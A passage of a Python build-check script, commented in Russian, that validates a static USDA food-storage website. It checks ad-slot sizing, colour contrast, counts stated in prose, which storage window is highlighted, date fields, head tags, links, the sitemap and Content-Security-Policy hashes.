    # Охрана выборки стояла ВНУТРИ `if rd.ADS`, то есть выключалась тем
    # же флагом, который охраняет: при ADS=False гейт печатал «пройден»,
    # не посмотрев ни на одну страницу. Страницы читаются ВСЕГДА, а места
    # — когда реклама объявлена включённой.
    bad = bad or _seen(pages, "страниц проверено на рекламу")
    if rd.ADS:
        bad = bad or _seen(seen, "рекламных мест")
    return bad[:8]


def _css_blocks(css):
    """CSS -> [(минимальная ширина экрана, селектор, объявления)].

    Разбор нужен потому, что размеры места живут в media-блоках, а прежний
    гейт искал подстроку по всему файлу и не знал, какому классу и с какой
    ширины она принадлежит.
    """
    out, i, mq = [], 0, 0
    stack = []
    while i < len(css):
        # Пробелы съедаются ПЕРВЫМИ: иначе перевод строки перед «@media»
        # уводит разбор в ветку обычного правила, и весь media-блок
        # становится частью селектора — размеры всех мест уезжают на нулевую
        # ширину экрана и гейт сравнивает не то с не тем.
        if css[i] in " \n\t\r":
            i += 1
            continue
        if css[i] == "@":
            j = css.find("{", i)
            head = css[i:j]
            m = re.search(r"min-width:\s*(\d+)px", head)
            stack.append(mq)
            mq = int(m.group(1)) if m else 0
            i = j + 1
            continue
        if css[i] == "}":
            if stack:
                mq = stack.pop()
            i += 1
            continue
        j = css.find("{", i)
        if j < 0:
            break
        k = css.find("}", j)
        sel = css[i:j].strip()
        if sel:
            out.append((mq, sel, css[j + 1:k]))
        i = k + 1
    return out


def _slot_sizes(css):
    """Класс -> {ширина экрана: (ширина, высота)} по РАЗОБРАННОМУ CSS."""
    sizes = {}
    for mq, sel, body in _css_blocks(css):
        w = re.search(r"width:(\d+)px", body)
        h = re.search(r"height:(\d+)px", body)
        if not (w and h):
            continue
        for one in sel.split(","):
            m = re.match(r"^\s*\.(ad-[a-z0-9-]+)\s*$", one)
            if m:
                sizes.setdefault(m.group(1), {})[mq] = (int(w.group(1)),
                                                        int(h.group(1)))
    return sizes


def _container(slot, vw):
    """Ширина контейнера места на экране vw — ПОСЧИТАННАЯ, а не взятая из
    того же CSS, что проверяем.

    Числа те же, что в облике: поле 10/24px, бирка 520px и не растёт, лист
    до 1120px, две колонки с 1024px. Гейт, который берёт ответ у проверяемого,
    согласен сам с собой — у нас такой уже был.
    """
    pad = 8 if vw < 600 else 24        # calc(var(--u)*2) и calc(var(--u)*6)
    avail = vw - 2 * pad
    two = vw >= 1024
    sheet = min(avail, 1120 if two else 520)
    # Кромка листа — 1px с каждой стороны, и она СЪЕДАЕТ ширину креатива:
    # объявленные 300px в листе шириной ровно 300 обрезаются на два пикселя,
    # и увидеть это можно только расчётом — переполнения не возникает.
    inner = sheet - 2
    if slot == "ad-rail":
        # На широком рельса стоит в колонке бирки ребёнком листа: рамки
        # вокруг неё там нет, ширина колонки ровно --tag.
        return 520 if two else inner
    if slot == "ad-flow":
        return (sheet - 520 - 2) if two else inner
    return min(avail, 1120)


PROBE_WIDTHS = (320, 359, 360, 375, 599, 600, 775, 776, 899, 1023, 1024,
                1280, 1440)


def g_ad_slots_exact(files):
    """Размер места задан ТОЧНО, совпадает с объявлением и ВЛЕЗАЕТ в колонку.

    Объявленный 728x90, отрисованный как 439x90, — недобор инвентаря, то есть
    денег, и заметить его можно только измерением: `overflow:hidden` съедал
    остаток, переполнения документа не возникало, и гейт сравнивал ширину из
    CSS с той же самой шириной из CSS.

    Здесь три разные проверки: объявление против CSS, CSS против объявления,
    и — отдельным расчётом — ширина места против ширины его контейнера на
    тринадцати ширинах экрана.
    """
    import design
    import render as rd
    if not rd.ADS:
        return ["реклама выключена: проверять нечего"]
    css = design.strip_comments(design.AD_CSS)
    have = _slot_sizes(css)
    bad = []
    for cls, decl in sorted(rd.AD_SLOTS.items()):
        want = {mq: (w, h) for mq, w, h in decl}
        if cls not in have:
            bad.append("%s: класс не объявлен в CSS" % cls)
            continue
        if have[cls] != want:
            bad.append("%s: в CSS %s, объявлено %s"
                       % (cls, sorted(have[cls].items()),
                          sorted(want.items())))
        for vw in PROBE_WIDTHS:
            box = None
            for mq in sorted(want):
                if vw >= mq:
                    box = want[mq]
            if box is None:
                bad.append("%s: на %dpx размер не задан" % (cls, vw))
                continue
            room = _container(cls, vw)
            if box[0] > room:
                bad.append("%s: %dx%d на экране %dpx не влезает в %dpx"
                           % (cls, box[0], box[1], vw, room))
    for cls in have:
        if cls not in rd.AD_SLOTS:
            bad.append("%s: класс в CSS, но не объявлен в AD_SLOTS" % cls)
    return (bad or _seen(len(rd.AD_SLOTS) * len(PROBE_WIDTHS),
                         "замеров места на ширинах"))[:8]


def g_answer_above_the_ad(files):
    """Ответ стоит ВЫШЕ первой рекламы. На любом типе страницы.

    Прежняя единственная единица стояла на телефоне в районе y=700, ниже
    всей бирки; но защиты от обратного не было никакой, а «реклама выше
    ответа» — это и потеря читателя, и прямой риск по правилам размещения.
    Признак ответа берётся по типу страницы: у товара это флуоресцентное
    поле, у витрины и главной — первая строка списка или поле поиска.
    """
    marks = {"product": ('<div class="hot">', '<div class="hot" data-pick'),
             "hub": ('<ul class="near"', '<ul class="rows"'),
             "index": ('<nav class="hot hunt"',)}
    bad, seen = [], 0
    for p, t in sorted(_html(files).items()):
        first = t.find('<div class="ad ')
        if first < 0:
            continue
        seen += 1
        kind = _page_type(t)
        found = [t.find(m) for m in marks.get(kind, ()) if t.find(m) >= 0]
        if not found:
            bad.append("%s (%s): реклама есть, ответа не найдено"
                       % (p, kind or "?"))
        elif min(found) > first:
            bad.append("%s: реклама выше ответа" % p)
    return (bad or _seen(seen, "страниц с рекламой"))[:8]


# ------------------------------------------------------------------ контраст

def _srgb(c):
    c = c / 255.0
    return c / 12.92 if c <= 0.03928 else ((c + 0.055) / 1.055) ** 2.4


def _lum(rgb):
    return (0.2126 * _srgb(rgb[0]) + 0.7152 * _srgb(rgb[1])
            + 0.0722 * _srgb(rgb[2]))


def _contrast(fg, bg):
    """Контраст ДВУХ НЕПРОЗРАЧНЫХ цветов по WCAG 2.x."""
    a, b = _lum(fg), _lum(bg)
    if a < b:
        a, b = b, a
    return (a + 0.05) / (b + 0.05)


def _parse_color(s):
    """«#rgb», «#rrggbb», «rgba(r,g,b,a)» -> (r, g, b, a)."""
    s = s.strip()
    m = re.match(r"^#([0-9a-fA-F]{3}|[0-9a-fA-F]{6})$", s)
    if m:
        h = m.group(1)
        if len(h) == 3:
            h = "".join(ch * 2 for ch in h)
        return (int(h[0:2], 16), int(h[2:4], 16), int(h[4:6], 16), 1.0)
    m = re.match(r"^rgba?\(([^)]*)\)$", s)
    if m:
        parts = [x.strip() for x in m.group(1).split(",")]
        vals = [float(x) for x in parts[:3]]
        a = float(parts[3]) if len(parts) > 3 else 1.0
        return (vals[0], vals[1], vals[2], a)
    return None


def _over(fg, bg):
    """Полупрозрачный цвет НАКЛАДЫВАЕТСЯ на свой фон и только потом
    сравнивается. Без этого волосяная линия при альфе .24 «проходила» бы как
    чистая краска — а видно её было 1,69:1."""
    r, g, b, a = fg
    return (r * a + bg[0] * (1 - a), g * a + bg[1] * (1 - a),
            b * a + bg[2] * (1 - a))


def _tokens(css):
    """Значения переменных для СВЕТЛОЙ и ТЁМНОЙ темы по тексту стиля."""
    light, dark = {}, {}
    i = css.find(":root{")
    body = css[i + 6:css.find("}", i)]
    for k, v in re.findall(r"(--[a-z0-9-]+):([^;]+);", body):
        light[k] = v.strip()
    m = re.search(r"@media \(prefers-color-scheme:dark\)\{\s*:root\{(.*?)\}",
                  css, re.S)
    dark = dict(light)
    if m:
        for k, v in re.findall(r"(--[a-z0-9-]+):([^;]+);", m.group(1)):
            dark[k] = v.strip()
    return light, dark


# Пары, которые обязаны читаться, и МИНИМУМ для каждой. Графика — 3:1,
# текст — 4,5:1. Список объявлен здесь, а не выведен из CSS: гейт, который
# сам решает, что проверять, ничего не проверяет.
#
# ПЕРЕПИСАН 15.09.2026 под облик «Дата, а не срок». Четыре пары исчезли не
# потому, что стали неудобны, а потому, что исчезла роль: сигнал перестал
# быть ЗАЛИВКОЙ и стал краской, и на нём больше ничего не лежит — ни текста,
# ни линии, ни подписи. Токенов --on-signal, --sig-cap и --sig-hair в облике
# нет вовсе, и гейт это увидел сам, упав на «нет переменной», а не позеленев
# молча. Взамен заведены пять пар на роли, которых раньше не было: сигнал
# теперь ТЕКСТ, и его читаемость — вопрос 4,5:1, а не 3:1, и спрошен он на
# обоих фонах. Пар стало тринадцать вместо двенадцати.
CONTRAST_PAIRS = (
    ("кольцо фокуса и рамка ввода на бумаге", "--heavy", "--stock", 3.0),
    ("кольцо фокуса и рамка ввода под листом", "--heavy", "--surface", 3.0),
    ("подчёркивание поля ввода при фокусе", "--signal", "--stock", 3.0),
    ("тусклый текст на фоне под листом", "--ink2", "--surface", 4.5),
    ("волосяная линия на бумаге", "--hair", "--stock", 3.0),
    ("линия реестра на фоне под листом", "--edge", "--surface", 3.0),
    # Самая громкая линия системы: полоса 7px наверху страницы и граница
    # «ответ кончился». В прежнем облике этим токеном была нарисована
    # перфорация, и до отдельной волны она делила значение с волосяной.
    ("громкая линия на бумаге", "--tear", "--stock", 3.0),
    ("громкая линия на фоне под листом", "--tear", "--surface", 3.0),
    ("основной текст", "--ink", "--stock", 4.5),
    ("основной текст на фоне под листом", "--ink", "--surface", 4.5),
    ("тусклый текст", "--ink2", "--stock", 4.5),
    # СИГНАЛЬНАЯ ДАТА — единственное, ради чего сигнал существует, и она
    # ТЕКСТ. Порог для неё текстовый, а не графический.
    ("сигнальная дата на бумаге", "--signal", "--stock", 4.5),
    ("сигнальная дата на фоне под листом", "--signal", "--surface", 4.5),
)


def g_contrast(files):
    """Каждая объявленная пара читается в ОБЕИХ темах.

    Найдено измерением, а не глазом: кольцо фокуса рисовалось сигнальным
    цветом, который не меняется от темы, и на белой бумаге давало 1,28:1 —
    невидимый фокус на каждой ссылке и каждом поле светлой темы. Волосяная
    линия, которой нарисована ВСЯ структура полей, давала 1,69:1 и 2,07:1.
    Каждый цвет был объявлен и переопределён правильно; никто не проверил
    ПАРУ. Это тот же дефект, что у нас уже был при 1,07:1.

    Полупрозрачные значения сначала накладываются на свой фон: сравнивать
    альфу с фоном напрямую — значит проверять не то, что видно.
    """
    import design
    css = design.strip_comments(design.CSS)
    themes = dict(zip(("светлая", "тёмная"), _tokens(css)))
    bad, seen = [], 0
    for theme, tok in sorted(themes.items()):
        for name, fg, bg, need in CONTRAST_PAIRS:
            if fg not in tok or bg not in tok:
                bad.append("%s: нет переменной %s или %s" % (name, fg, bg))
                continue
            c1, c2 = _parse_color(tok[fg]), _parse_color(tok[bg])
            if not c1 or not c2:
                bad.append("%s: цвет не разобран" % name)
                continue
            if c2[3] < 1:
                bad.append("%s: фон полупрозрачен" % name)
                continue
            r = _contrast(_over(c1, c2[:3]), c2[:3])
            if r < need:
                bad.append("%s, %s тема: %.2f:1 при минимуме %.1f"
                           % (name, theme, r, need))
            seen += 1
    return (bad or _seen(seen, "измеренных пар цвета"))[:8]


def g_numbers_agree(files):
    """Число, названное в прозе, совпадает с тем, что на сайте ЕСТЬ.

    Каждая страница считала своё население сама, и на соседнем сайте три
    страницы разошлись: 218 против 210, 134 против 126, обещанные 160
    оболочек против 11 страниц. Гейт сверяет заявленное с фактическим
    содержимым выкладки.
    """
    bad, seen = [], 0
    products = len(_products(files))
    home = files.get("index.html", "")
    m = re.search(r"<b>(\d+)</b> foods across <b>(\d+)</b> categories",
                  home)
    if not m:
        bad.append("главная не называет число продуктов и категорий")
    else:
        if int(m.group(1)) != products:
            bad.append("главная обещает %s продуктов, страниц %d"
                       % (m.group(1), products))
        cats = len({x.split("/")[1] for x in files
                    if x.startswith("category/") and x.endswith("index.html")})
        if int(m.group(2)) < cats:
            bad.append("главная обещает %s категорий, витрин %d"
                       % (m.group(2), cats))

    all_ix = files.get("all/index.html", "")
    m2 = re.search(r"(\d+) foods, each with its own page", all_ix)
    if not m2:
        bad.append("указатель не называет число продуктов")
    elif int(m2.group(1)) != products:
        bad.append("указатель обещает %s продуктов, страниц %d"
                   % (m2.group(1), products))

    # Витрины: обещанное число строк равно числу строк таблицы.
    for path, pat in (("freezer-gains/index.html",
                       r"[Tt]hese (\d+) gain the most"),
                      ("after-opening/index.html",
                       r"[Tt]hese (\d+) foods lose the most")):
        page = files.get(path, "")
        if not page:
            # Пропавшая витрина выключала проверку молча: гейт стоял
            # внутри условия, которое обязан охранять.
            bad.append("%s: витрины нет в сборке" % path)
            continue
        seen += 1
        m3 = re.search(pat, page)
        rows = len(re.findall(r'<ul class="near"[^>]*>.*?</ul>', page, re.S)
                   and re.findall(r'<li><a href="/[^"]+/"><span class="n">',
                                  page) or [])
        # Ноль строк — не повод пропустить проверку. Прежде условие
        # `if m3 and rows` выключало гейт ровно тогда, когда список исчезал.
        if not m3:
            bad.append("%s не называет число строк" % path)
        elif not rows:
            bad.append("%s обещает %s строк, а списка нет вовсе"
                       % (path, m3.group(1)))
        elif int(m3.group(1)) != rows:
            bad.append("%s обещает %s строк, в списке %d"
                       % (path, m3.group(1), rows))
    return bad or _seen(seen + 2, "утверждений о числах")


# Состояние упаковки, переписанное здесь НАРОЧНО: гейт, спрашивающий у
# проверяемого модуля, согласен сам с собой и остаётся зелёным, когда тот
# ломают.
_OPENING = {"fridge": "plain", "pantry": "plain",
            "fridge_purchase": "bought", "pantry_purchase": "bought",
            "fridge_open": "open", "pantry_open": "open",
            "fridge_thaw": "thaw"}


def g_hot_is_the_binding_window(files):
    """Флуоресцентным помечено то, что КОНЧИТСЯ ПЕРВЫМ, а не то, что длиннее.

    Прежде страница писала «the only method the USDA rates for it», пока её
    собственная таблица несла второе значение: на 76 страницах, и на 56 из
    них спрятанным был срок ПОСЛЕ ВСКРЫТИЯ — в шапке пять лет, в таблице
    четыре дня.

    В облике «бирка» это правило стало физическим: единственное сигнальное
    поле обязано нести самое короткое окно. Гейт считает его ПО ДАННЫМ сам и
    сверяет с тем, что напечатано.

    ОБЛАСТЬ ПРАВИЛА ИЗМЕНЕНА, и это не послабление. «Кончится первым»
    считается теперь среди ячеек ВЕДУЩЕГО состояния, а не среди всех: у
    продукта с несколькими видами состояния — разная еда, и самое короткое
    окно через все виды выбирало не то окно, а не тот продукт. Страница
    /eggs/ так отвечала сроком сырых белков (2 дня, «выброси») там, где яйца
    в скорлупе держатся три-пять недель. Какое состояние ведущее — факт из
    корпуса; ПРАВИЛО, по которому оно выбрано, проверяет отдельный гейт
    «за страницу отвечает ведущее состояние».
    """
    import prose as pr
    import render as rd
    by_slug = {x["slug"]: x for x in rd.load_corpus()[0]}         if hasattr(rd, "load_corpus") else {}
    if not by_slug:
        return ["нечем свериться: корпус не читается"]
    bad, seen = [], 0
    for p, t in _products(files).items():
        it = by_slug.get(p.split("/")[0])
        if not it:
            continue
        # Считаем САМИ, по всем состояниям продукта: страница заводится на
        # продукт, и первым кончиться может окно любого из его состояний.
        sts = pr.states_of(it)
        rated = [(i, st, key, v[0], v[1])
                 for i, st in enumerate(sts)
                 for key, _f, _l in fk.SLOTS
                 for v in [st["slots"].get(key)]
                 if v and v[0] != "no"]
        if not rated:
            continue
        seen += 1
        # Страница может не иметь сигнального окна ПО ПРАВИЛУ, и тогда она
        # обязана печатать поле выбора: см. _no_signal_reason. Проверяется
        # обе стороны — поле выбора там, где окна нет, и его отсутствие там,
        # где окно есть.
        why = _no_signal_reason(it)
        pick = 'class="hot" data-pick' in t
        if why:
            if not pick:
                bad.append("%s: сигнального окна быть не может (%s), а поля "
                           "выбора нет" % (p, why))
            continue
        if pick:
            bad.append("%s: напечатано поле выбора там, где сигнальное окно "
                       "есть" % p)
            continue
        own = [r for r in rated if r[1].get("id") == _lead_state_of(it).get(
            "id")]
        rated = own or rated
        # Правило пересчитывается ЗДЕСЬ, а не берётся у генератора: гейт,
        # спрашивающий у проверяемой функции, согласен сам с собой и остаётся
        # зелёным, когда её ломают. Морозилка выбывает, пока есть окно вне
        # неё (замороженное при 0 °F безопасно сколько угодно), и сравнение
        # идёт по ОСТОРОЖНОМУ концу диапазона.
        warm = [r for r in rated if not r[2].startswith("freeze")]
        pool = warm or rated
        # ТРЕТЬЕ правило: ячейка короче суток — это предел пребывания в
        # тепле, а не окно хранения. Пока она связывала, /pies/ и /quiche/
        # отвечали двумя часами при недельном и пятидневном холодильном окне
        # того же вида. Снимается, когда деться некуда.
        keep = [r for r in pool if r[4] >= fk.SAFETY_LIMIT_DAYS]
        pool = keep or pool
        # ЧЕТВЁРТОЕ правило, и оно тоже пересчитывается здесь руками: ячейка, у
        # которой в ТОМ ЖЕ состоянии и при том же вскрытии есть место с более
        # длинным окном, никого не связывает — она означает лишь «положили не
        # туда». Сигналом это помечалось на 48 страницах, включая картошку,
        # которой источник сам же советует холодильника избегать.
        groups = {}
        for r in rated:
            g = (r[0], _OPENING.get(r[2]))
            if g[1] is not None:
                groups.setdefault(g, []).append(r)
        beaten = set()
        for g, rows in groups.items():
            for a in rows:
                for b in rows:
                    if b[3] >= a[3] and b[4] >= a[4] and b[3] > a[3]:
                        beaten.add((a[0], a[2]))
        live = [r for r in pool if (r[0], r[2]) not in beaten]
        pool = live or pool
        i, st, key, _lo, _hi = min(pool, key=lambda r: (r[3], r[4], r[0],
                                                        r[2]))
        want_cap = pr.SLOT_LABEL[key]
        if len(sts) > 1:
            want_cap = "%s &middot; %s" % (pr.esc(pr.kind_title(it, st)),
                                           want_cap)
        m = re.search(r'<div class="hot">\s*<div class="cap">(.*?)</div>', t,
                      re.S)
        if not m:
            bad.append("%s: нет сигнального поля" % p)
            continue
        if not _cap_names(m.group(1).strip(), want_cap):
            bad.append("%s: сигналом помечено «%s», а первым кончается «%s»"
                       % (p, m.group(1).strip(), want_cap))
        # И оно обязано нести САМУ величину, а не только подпись.
        val = pr.st_text(st, key)
        if val not in t:
            bad.append("%s: величина «%s» не напечатана" % (p, val))
    return (bad or _seen(seen, "страниц, которым есть с чем сверяться"))[:8]


def g_every_state_named(files):
    """Каждое состояние продукта напечатано и названо СВОИМ подзаголовком.

    Единица публикации — продукт, а у ходовой еды источник держит под одним
    именем несколько строк с РАЗНЫМИ сроками. Ненапечатанное состояние — это
    молча выброшенная строка источника (мы уже теряли так 444 348 домов), а
    напечатанное без имени — страница, которая врёт: три окна подряд без
    подписи читаются как одно.
    """
    import prose as pr
    import render as rd
    by_slug = {x["slug"]: x for x in rd.load_corpus()[0]}
    if not by_slug:
        return ["нечем свериться: корпус не читается"]
    bad, seen = [], 0
    for p, t in _products(files).items():
        it = by_slug.get(p.split("/")[0])
        if not it:
            continue
        seen += 1
        want = [pr.esc(pr.kind_title(it, st)) for st in pr.states_of(it)]
        # Проверяется ИМЕННО БЛАНК ВЕЛИЧИН, а не страница целиком: заголовки
        # состояний печатает и календарь, и первая версия гейта считала
        # снятый из бланка заголовок присутствующим, потому что видела его
        # копию ниже. Множество — не то же, что список: гейт спрашивает,
        # ЗДЕСЬ ли названо каждое состояние.
        blk = re.search(r"<h2>Every storage figure the USDA publishes for "
                        r"this item</h2>(.*?)(?=<h2>|$)", t, re.S)
        if not blk:
            bad.append("%s: бланка величин нет вовсе" % p)
            continue
        heads = re.findall(r'<h3 class="kind">(.*?)</h3>', blk.group(1))
        if len(want) < 2:
            # У продукта из одной строки заголовков состояний быть не должно:
            # лишний заголовок означал бы выдуманное состояние.
            if '<h3 class="kind">' in t:
                bad.append("%s: одно состояние, а заголовки состояний есть" % p)
            continue
        if heads != want:
            missing = [x for x in want if x not in heads]
            bad.append("%s: в бланке %d заголовков состояний, состояний %d%s"
                       % (p, len(heads), len(want),
                          (", нет «%s»" % missing[0][:40]) if missing else ""))
        for name in re.findall(r'<h3 class="kind">(.*?)</h3>', t):
            if name not in want:
                bad.append("%s: напечатано состояние «%s», которого нет в "
                           "источнике" % (p, name[:48]))
    return (bad or _seen(seen, "страниц продукта"))[:8]


def g_neighbours_are_products(files):
    """Соседи — ДРУГИЕ продукты, и их не меньше трёх.

    Пока единицей была строка источника, соседями продукта оказывались его
    собственные состояния: ссылка вела на почти дословный близнец, а близнец
    гейтом не выпускался — тупик и близнец одним движением.
    """
    import render as rd
    bad, seen = [], 0
    for p, t in _products(files).items():
        own = "/" + p[:-len("index.html")]
        m = re.search(r"<h2>Items that behave the same way</h2>.*?"
                      r'<ul class="near"[^>]*>(.*?)</ul>', t, re.S)
        if not m:
            bad.append("%s: блока соседей нет вовсе" % p)
            continue
        seen += 1
        hrefs = re.findall(r'<li><a href="([^"]+)"', m.group(1))
        if len(hrefs) < rd.NEIGHBOURS[0]:
            bad.append("%s: соседей %d, нужно %d"
                       % (p, len(hrefs), rd.NEIGHBOURS[0]))
        if len(set(hrefs)) != len(hrefs):
            bad.append("%s: сосед повторяется" % p)
        if own in hrefs:
            bad.append("%s: сосед — сама страница" % p)
    return (bad or _seen(seen, "страниц продукта"))[:8]


def g_calc_sides_differ(files):
    """Две стороны напечатанного расчёта — РАЗНЫЕ величины.

    «150 days sealed &divide; 90 days sealed»: одно слово «sealed» отвечало и
    за шкаф, и за холодильник, и отношение читалось как деление величины на
    саму себя. Заодно проверяется знаменатель: ноль дней в знаменателе — это
    двухчасовой предел опасной зоны, округлённый до нуля и поданный как
    выгода морозилки.
    """
    bad, seen = [], 0
    for p, t in _products(files).items():
        for m in re.finditer(r'<span class="calc">([^<]*)</span>', t):
            seen += 1
            c = m.group(1)
            if c.count("&divide;") != 1:
                bad.append("%s: в расчёте не одно деление — «%s»" % (p, c))
                continue
            left, right = [x.strip() for x in c.split("&divide;")]
            if left.split(None, 1)[1:] == right.split(None, 1)[1:]:
                bad.append("%s: обе стороны расчёта названы одинаково — «%s»"
                           % (p, c))
            if re.match(r"^0 ", right):
                bad.append("%s: в знаменателе ноль — «%s»" % (p, c))
    return (bad or _seen(seen, "расчётов на страницах"))[:8]


def g_head_terms(files):
    """Голова ниши не может исчезнуть молча.

    Корпус набирался по номеру записи в источнике, и на 221 странице не было
    ни листовков, ни молока, ни яиц, ни курицы — то есть ни одного запроса, с
    которого ниша начинается. Список запросов записан в render.HEAD_TERMS и
    задаёт ПОРЯДОК рассмотрения; гейт требует, чтобы каждый термин находил
    продукт в источнике. Список, переставший что-либо находить, — это рычаг,
    которого нет, а на такой рассчитывают.

    Гейт НЕ требует, чтобы у каждого термина была страница: страницу может
    честно снять гейт близнецов, и требовать её значило бы давить на порог
    сходства. Сколько терминов остались без страницы, печатает сборка.
    """
    import render as rd
    items = rd.load_corpus()[0]
    matches = rd.head_matches(items)
    bad, seen = [], 0
    for term in rd.HEAD_TERMS:
        seen += 1
        hits = matches.get(term) or []
        if not hits:
            bad.append("термин «%s» не находит в источнике ничего" % term)
            continue
    return (bad or _seen(seen, "запросов головы ниши"))[:8]


def g_date_clocks(files):
    """У каждой датируемой строки есть СВОЙ отсчёт, и поле для него на странице.

    Календарь предлагал одно поле «Stored on» и подставлял его во все строки
    сразу: 323 строки на 173 страницах считались не от того события. Ошибка шла
    в обе стороны — срок от покупки продлевался, срок после вскрытия
    укорачивался, — а страница тут же писала «две стрелки идут на этом
    продукте».

    Плюс: срок короче суток не имеет права стать датой. Двухчасовой предел при
    комнатной температуре, показанный датой, читается как разрешение на день.

    Само поле в разметке не отрисовано: его строит скрипт, потому что поле
    даты без скрипта — мёртвый контрол. Поэтому здесь считаются ОБЪЯВЛЕННЫЕ
    места полей, а гейт мёртвых контролов отдельно требует, чтобы ни одного
    готового `input` в отданном не было.
    """
    bad, seen = [], 0
    for p, t in _products(files).items():
        cells = re.findall(r"<(?:td|span|div)([^>]*data-lo=[^>]*)>", t)
        if not cells:
            continue
        seen += 1
        inputs = set(re.findall(
            r'class="(?:dateline|second)" data-clock="([a-z]+)" '
            r'data-label="[^"]+"', t))
        for attrs in cells:
            m = re.search(r'data-clock="([a-z]+)"', attrs)
            if not m:
                bad.append("%s: датируемая строка без отсчёта" % p)
                continue
            if m.group(1) not in inputs:
                bad.append("%s: отсчёт «%s» без своего поля" % (p, m.group(1)))
            lo = re.search(r'data-lo="(-?[0-9]+)"', attrs)
            hi = re.search(r'data-hi="(-?[0-9]+)"', attrs)
            if lo and hi and int(hi.group(1)) < 1:
                bad.append("%s: срок короче суток показан датой" % p)
            if not re.search(r'data-plain="[^"]+"', attrs):
                bad.append("%s: строке нечего показать без скрипта" % p)
        # Одно поле на несколько разных отсчётов — исходный дефект.
        clocks = {re.search(r'data-clock="([a-z]+)"', a).group(1)
                  for a in cells if 'data-clock="' in a}
        if len(clocks) > len(inputs):
            bad.append("%s: отсчётов %d, полей %d" % (p, len(clocks),
                                                      len(inputs)))
    return (bad or _seen(seen, "датируемых строк"))[:8]


def g_head(files):
    """Title, описание, канонический адрес, ровно один h1."""
    bad, seen = [], 0
    for p, t in _html(files).items():
        seen += 1
        m = re.search(r"<title>(.*?)</title>", t, re.S)
        if not m:
            bad.append("%s: нет title" % p)
        elif len(m.group(1)) > TITLE_MAX:
            bad.append("%s: title %d знаков" % (p, len(m.group(1))))
        d = re.search(r'<meta name="description" content="([^"]*)"', t)
        if not d or not DESC_MIN <= len(d.group(1)) <= DESC_MAX:
            bad.append("%s: описание %s"
                       % (p, len(d.group(1)) if d else "отсутствует"))
        # Описание обрывалось ровно на 158-м знаке, и 49 из 221 кончались
        # обрубком слова: «from the USDA figur». В выдаче это единственный
        # текст, который человек читает до перехода. Обрезка чинится в
        # сборке, но проверять её обязан гейт: длина есть, а конца фразы
        # никто не спрашивал.
        elif d.group(1).rstrip()[-1] not in ".!?" + chr(8230):
            bad.append("%s: описание обрывается на «%s»"
                       % (p, d.group(1)[-24:]))
        c = re.search(r'<link rel="canonical" href="([^"]*)"', t)
        want = "/" + p[:-len("index.html")] if p.endswith("index.html") else "/" + p
        if not c:
            bad.append("%s: нет canonical" % p)
        elif not c.group(1).endswith(want):
            bad.append("%s: canonical %s, ожидалось %s"
                       % (p, c.group(1), want))
        n_h1 = len(re.findall(r"<h1[ >]", t))
        if n_h1 != 1:
            bad.append("%s: h1 встречается %d раз" % (p, n_h1))
    return (bad or _seen(seen, "голов страниц"))[:8]


def g_internal_links(files):
    """Ни одной внутренней ссылки в никуда: тупик хуже отсутствия ссылки.

    Адреса берутся РАЗБОРОМ тегов, а не регуляркой на двойные кавычки:
    `href='/x'` и `href=/x` ведут туда же, куда `href="/x"`, и прежняя
    проверка видела одну запись из трёх. Заодно сюда попал `area`, которого
    регулярка не различала вовсе.
    """
    have = set()
    for p in files:
        have.add("/" + p)
        if p.endswith("index.html"):
            have.add("/" + p[:-len("index.html")])
    bad, seen = [], 0
    for p, t in _html(files).items():
        for _tag, at in _tags(t):
            r = at.get("href")
            if r is None or not r.startswith("/") or r.startswith("//"):
                continue
            seen += 1
            r = r.split("#")[0]
            if r and r not in have:
                bad.append("%s -> %s" % (p, r))
    return sorted(set(bad or _seen(seen, "внутренних ссылок")))[:20]


def g_orphans(files):
    """На каждую страницу ведёт хотя бы одна ссылка. Страница, на которую
    нельзя прийти, не индексируется и не читается."""
    linked = set()
    for t in _html(files).values():
        for r in re.findall(r'href="(/[^"#]*)"', t):
            linked.add(r)
    bad, seen = [], 0
    for p in _html(files):
        if p in ("index.html", "404.html"):
            continue
        seen += 1
        url = "/" + (p[:-len("index.html")] if p.endswith("index.html") else p)
        if url not in linked:
            bad.append(url)
    return sorted(bad or _seen(seen, "страниц без главной"))[:20]


def g_sitemap(files):
    """В карте только существующие индексируемые адреса, и ни одного лишнего."""
    sm = files.get("sitemap.xml")
    if not sm:
        return ["нет sitemap.xml"]
    listed = re.findall(r"<loc>https://[^/]+([^<]*)</loc>", sm)
    bad = []
    for url in listed:
        rel = url.lstrip("/") + ("index.html" if url.endswith("/") else "")
        if rel not in files:
            bad.append("в карте нет такого файла: %s" % url)
        elif "noindex" in files[rel]:
            bad.append("в карте закрытая от индексации: %s" % url)
    indexable = set()
    for p, t in _html(files).items():
        if "noindex" not in t:
            indexable.add("/" + (p[:-len("index.html")]
                                 if p.endswith("index.html") else p))
    missing = indexable - set(listed)
    if missing:
        bad.append("не попали в карту: %d, например %s"
                   % (len(missing), sorted(missing)[0]))
    return bad or _seen(len(listed), "адресов в карте")


def g_robots(files):
    r = files.get("robots.txt", "")
    lines = [x for x in r.splitlines() if x.strip()]
    if "Sitemap:" not in r:
        return ["robots.txt не указывает карту сайта"] + \
            _seen(len(lines), "строк robots.txt")
    return _seen(len(lines), "строк robots.txt")


def _csp_meta(t):
    """Политика безопасности, НАПЕЧАТАННАЯ в странице, и ничего кроме.

    Разбором, а не регуляркой на двойные кавычки: тот же дефект здесь уже
    чинили трижды, и браузеру всё равно, какими кавычками записан атрибут.
    """
    out = []
    for tag, at in _tags(t):
        if tag == "meta" and (at.get("http-equiv") or "").lower() \
                == "content-security-policy":
            out.append(_entities(at.get("content", "")))
    return out


def _csp_dirs(value):
    """Директива -> её источники, ровно как их прочтёт браузер."""
    out = []
    for piece in value.split(";"):
        w = piece.split()
        if w:
            out.append((w[0].lower(), w[1:]))
    return out


def _inline_hashes(t, tag):
    """sha256 встроенных кусков СОБРАННОЙ страницы — тех, что браузер
    исполняет.

    Блок данных (`application/json`, `application/ld+json`) браузер не
    готовит к исполнению, и политика его не касается: включить его хэш
    значило бы обещать в политике то, чего браузер не спросит.
    """
    out = []
    for a, body in re.findall(r"<%s([^>]*)>(.*?)</%s>" % (tag, tag), t, re.S):
        if tag == "script" and _is_data(a):
            continue
        out.append("'sha256-%s'" % base64.b64encode(
            hashlib.sha256(body.encode("utf-8")).digest()).decode("ascii"))
    return out


def g_csp_backs_the_carriers(files):
    """Политика безопасности стоит на КАЖДОЙ странице, совпадает с тем, что
    страница несёт, и закрывает КАЖДУЮ объявленную несущую.

    ЗАЧЕМ ОНА ВООБЩЕ. Гейт внешних адресов доказывает, что НАШ генератор
